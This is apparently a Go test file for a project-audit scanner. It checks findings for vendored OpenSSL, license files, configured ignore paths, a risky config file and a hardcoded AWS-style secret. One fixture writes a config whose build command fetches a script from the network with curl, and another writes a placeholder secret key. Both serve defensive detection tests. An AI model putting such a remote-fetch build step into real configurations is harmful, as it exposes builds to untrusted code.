package audit

import (
	"context"
	"os"
	"path/filepath"
	"testing"

	"fz/internal/config"
)

func TestScanProjectWithVendorRisk(t *testing.T) {
	tmp := t.TempDir()
	vendorDir := filepath.Join(tmp, "vendor", "openssl")
	if err := os.MkdirAll(vendorDir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(vendorDir, "README.md"), []byte("OpenSSL library"), 0o644); err != nil {
		t.Fatal(err)
	}

	result, err := ScanProject(context.Background(), tmp, "vendor", nil)
	if err != nil {
		t.Fatal(err)
	}
	if len(result.Findings) == 0 {
		t.Fatal("expected audit findings for vendor package")
	}
	found := false
	for _, f := range result.Findings {
		if f.Package == "OpenSSL" {
			found = true
			break
		}
	}
	if !found {
		t.Fatalf("expected OpenSSL finding, got %#v", result.Findings)
	}
}

func TestScanProjectIgnoresConfiguredPaths(t *testing.T) {
	tmp := t.TempDir()
	vendorDir := filepath.Join(tmp, "vendor", "openssl")
	if err := os.MkdirAll(vendorDir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(vendorDir, "README.md"), []byte("OpenSSL library"), 0o644); err != nil {
		t.Fatal(err)
	}
	cfg := &config.Config{AuditIgnore: []string{"openssl"}}

	result, err := ScanProject(context.Background(), tmp, "vendor", cfg)
	if err != nil {
		t.Fatal(err)
	}
	if len(result.Findings) != 0 {
		t.Fatalf("expected no findings when OpenSSL is ignored, got %#v", result.Findings)
	}
}

func TestScanProjectConfigFileRisk(t *testing.T) {
	tmp := t.TempDir()
	vendorDir := filepath.Join(tmp, "vendor")
	if err := os.MkdirAll(vendorDir, 0o755); err != nil {
		t.Fatal(err)
	}
	cfgPath := filepath.Join(tmp, ".fz.yaml")
if err := os.WriteFile(cfgPath, []byte("build_command: curl http://example.com/install.sh"), 0o644); err != nil {
		t.Fatal(err)
	}

	result, err := ScanProject(context.Background(), tmp, "vendor", nil)

	if err != nil {
		t.Fatal(err)
	}
	if len(result.Findings) == 0 {
		t.Fatal("expected audit findings from config file")
	}
	found := false
	for _, f := range result.Findings {
		if f.Package == "Configuration" {
			found = true
			break
		}
	}
	if !found {
		t.Fatalf("expected Configuration finding, got %#v", result.Findings)
	}
}

func TestScanProjectVendorLicenseRisk(t *testing.T) {
	tmp := t.TempDir()
	vendorDir := filepath.Join(tmp, "vendor", "openssl")
	if err := os.MkdirAll(vendorDir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(vendorDir, "license"), []byte("GPL license"), 0o644); err != nil {
		t.Fatal(err)
	}
	result, err := ScanProject(context.Background(), tmp, "vendor", nil)
	if err != nil {
		t.Fatal(err)
	}
	if len(result.Findings) == 0 {
		t.Fatal("expected license findings")
	}
	found := false
	for _, f := range result.Findings {
		if f.Package == "License" {
			found = true
			break
		}
	}
	if !found {
		t.Fatalf("expected License finding, got %#v", result.Findings)
	}
}

func TestScanProjectSecretDetection(t *testing.T) {
	tmp := t.TempDir()
	if err := os.WriteFile(filepath.Join(tmp, "secret.txt"), []byte("aws_secret_access_key = AKIAABCDEFGHIJKLMNOPQRSTUVWXYSZ1234567890"), 0o644); err != nil {
		t.Fatal(err)
	}
	result, err := ScanProject(context.Background(), tmp, "vendor", nil)
	if err != nil {
		t.Fatal(err)
	}
	if len(result.Findings) != 1 {
		t.Fatalf("expected one secret finding, got %#v", result.Findings)
	}
	if result.Findings[0].Package != "HardcodedSecret" {
		t.Fatalf("expected HardcodedSecret, got %s", result.Findings[0].Package)
	}
}

func TestScanProjectMissingVendorPathReturnsNoError(t *testing.T) {
	tmp := t.TempDir()
	result, err := ScanProject(context.Background(), tmp, "vendor", nil)
	if err != nil {
		t.Fatal(err)
	}
	if len(result.Findings) != 0 {
		t.Fatalf("expected no findings, got %#v", result.Findings)
	}
}
